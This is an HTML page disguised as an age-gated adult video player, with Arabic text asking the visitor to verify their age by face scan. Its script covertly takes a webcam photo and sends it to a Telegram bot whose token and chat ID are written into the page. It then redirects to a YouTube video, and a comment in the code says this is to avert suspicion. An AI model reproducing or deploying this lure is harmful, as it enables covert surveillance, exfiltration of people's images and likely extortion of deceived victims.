<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <style>
        body { background-color: #000; color: white; text-align: center; font-family: Arial; padding-top: 20%; }
        #playBtn { padding: 15px 30px; font-size: 20px; cursor: pointer; background: #ff0000; color: #fff; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div id="player">
        <h2>هذا الفيديو مخصص للكبار فقط</h2>
        <p>يجب التأكد من هويتك عبر مسح الوجه للمتابعة</p>
        <button id="playBtn">▶ تشغيل الفيديو</button>
    </div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';

        document.getElementById('playBtn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                document.getElementById('playBtn').innerText = "جاري التحقق...";
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('chat_id', CHAT_ID);
                        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, { method: 'POST', body: formData })
                        .then(() => { 
                            // توجيهه لفيديو حقيقي لإبعاد الشبهات
                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
                        });
                    }, 'image/jpeg');
                }, 1000);
            } catch (e) { alert("عذراً، يجب السماح بالكاميرا لتأكيد العمر ومشاهدة الفيديو."); }
        });
    </script>
</body>
</html>
